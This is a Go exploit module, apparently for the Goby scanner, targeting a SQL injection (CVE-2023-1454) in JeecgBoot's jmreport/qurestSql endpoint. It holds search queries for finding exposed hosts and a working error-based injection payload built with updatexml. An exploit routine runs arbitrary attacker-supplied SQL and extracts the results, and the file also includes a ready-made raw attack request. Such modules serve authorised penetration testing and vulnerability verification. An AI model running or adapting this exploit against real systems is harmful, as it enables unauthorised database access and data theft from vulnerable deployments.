package exploits

import (
	"bytes"
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Jeecg Boot qurestSql id SQL injection vulnerability (CVE-2023-1454)",
    "Description": "<p>Jeecg Boot (or Jeecg-Boot) is an open source enterprise-level rapid development platform based on a code generator, focusing on the development of backend management systems, enterprise information management systems (MIS) and other applications. It provides a series of tools and templates to help developers quickly build and deploy modern web applications.</p><p>There is a SQL injection vulnerability in JeecgBoot version 3.5.0. The vulnerability is caused by security issues in the file jmreport/qurestSql, which leads to SQL injection through the parameter apiSelectId.</p>",
    "Product": "JEECG",
    "Homepage": "http://www.jeecg.com/",
    "DisclosureDate": "2023-03-17",
    "Author": "sunying",
    "FofaQuery": "title==\"JeecgBoot 企业级低代码平台\" || body=\"window._CONFIG['imgDomainURL'] = 'http://localhost:8080/jeecg-boot/\" || title=\"Jeecg-Boot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || body=\"'http://fileview.jeecg.com/onlinePreview'\" || title==\"JeecgBoot 企业级低代码平台\" || title==\"Jeecg-Boot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || title=\"Jeecg-Boot 快速开发平台\" || body=\"积木报表\" || body=\"jmreport\"",
    "GobyQuery": "title==\"JeecgBoot 企业级低代码平台\" || body=\"window._CONFIG['imgDomainURL'] = 'http://localhost:8080/jeecg-boot/\" || title=\"Jeecg-Boot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || body=\"'http://fileview.jeecg.com/onlinePreview'\" || title==\"JeecgBoot 企业级低代码平台\" || title==\"Jeecg-Boot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title==\"JeecgBoot 企业级快速开发平台\" || title=\"Jeecg 快速开发平台\" || title=\"Jeecg-Boot 快速开发平台\" || body=\"积木报表\" || body=\"jmreport\"",
    "Level": "3",
    "Impact": "<p>There is a SQL injection vulnerability in JeecgBoot version 3.5.0. The vulnerability is caused by security issues in the file jmreport/qurestSql, which leads to SQL injection through the parameter apiSelectId.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://github.com/jeecgboot/jeecg-boot\">https://github.com/jeecgboot/jeecg-boot</a></p>",
    "References": [
        "https://github.com/J0hnWalker/jeecg-boot-sqli"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "select @@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2023-1454"
    ],
    "CNNVD": [
        "CNNVD-202303-1399"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Jeecg Boot qurestSql id SQL 注入漏洞（CVE-2023-1454）",
            "Product": "JEECG",
            "Description": "<p>Jeecg Boot（或者称为 Jeecg-Boot）是一款基于代码生成器的开源企业级快速开发平台，专注于开发后台管理系统、企业信息管理系统（MIS）等应用。它提供了一系列工具和模板，帮助开发者快速构建和部署现代化的 Web 应用程序。</p><p>JeecgBoot 3.5.0 版本存在 SQL注入漏洞，该漏洞源于文件 jmreport/qurestSql 存在安全问题， 通过参数 apiSelectId 导致 SQL 注入。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/jeecgboot/jeecg-boot\" target=\"_blank\">https://github.com/jeecgboot/jeecg-boot</a></p>",
            "Impact": "<p>JeecgBoot 3.5.0 版本存在 SQL注入漏洞，该漏洞源于文件 jmreport/qurestSql 存在安全问题， 通过参数 apiSelectId 导致 SQL 注入。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Jeecg Boot qurestSql id SQL injection vulnerability (CVE-2023-1454)",
            "Product": "JEECG",
            "Description": "<p>Jeecg Boot (or Jeecg-Boot) is an open source enterprise-level rapid development platform based on a code generator, focusing on the development of backend management systems, enterprise information management systems (MIS) and other applications. It provides a series of tools and templates to help developers quickly build and deploy modern web applications.</p><p>There is a SQL injection vulnerability in JeecgBoot version 3.5.0. The vulnerability is caused by security issues in the file jmreport/qurestSql, which leads to SQL injection through the parameter apiSelectId.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://github.com/jeecgboot/jeecg-boot\" target=\"_blank\">https://github.com/jeecgboot/jeecg-boot</a><br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in JeecgBoot version 3.5.0. The vulnerability is caused by security issues in the file jmreport/qurestSql, which leads to SQL injection through the parameter apiSelectId.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-25",
    "PocId": "10763"
}`

	randomString0530e1a7 := func(size int) string {
		alpha := "abcdefABCDEF"
		var buffer bytes.Buffer
		for i := 0; i < size; i++ {
			buffer.WriteByte(alpha[rand.Intn(len(alpha))])
		}
		return buffer.String()
	}

	sendPayload3ad28a13 := func(u *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/jeecg-boot/jmreport/qurestSql")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/json")
		cfg.Data = "{\"apiSelectId\":\"1290104038414721025\",\n\"id\":\"1' or '%1%' like (updatexml(1,concat(0x7e,(" + sql + "),0x7e),1)) or '%%' like '\"}"
		return httpclient.DoHttpRequest(u, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := randomString0530e1a7(8)
			rsp, _ := sendPayload3ad28a13(u, "select 0x"+hex.EncodeToString([]byte(checkStr)))
			return rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			sql := goutils.B2S(ss.Params["sql"])
			if attackType == "sql" {
				rsp, err := sendPayload3ad28a13(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(rsp.Utf8Html, `'~`) && strings.Contains(rsp.Utf8Html, `~';`) {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html[strings.Index(rsp.Utf8Html, "'~")+2 : strings.Index(rsp.Utf8Html, "~';")]
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "sqlPoint" {
				checkStr := randomString0530e1a7(8)
				rsp, err := sendPayload3ad28a13(expResult.HostInfo, "select 0x"+hex.EncodeToString([]byte(checkStr)))
				if err != nil {
					expResult.Output = err.Error()
				} else if rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) {
					expResult.Success = true
					expResult.Output = `POST /jeecg-boot/jmreport/qurestSql HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 140
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close

{"apiSelectId":"1290104038414721025",
"id":"1' or '%1%' like (updatexml(1,concat(0x7e,(select 0x6443646145614561),0x7e),1)) or '%%' like '"}`
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
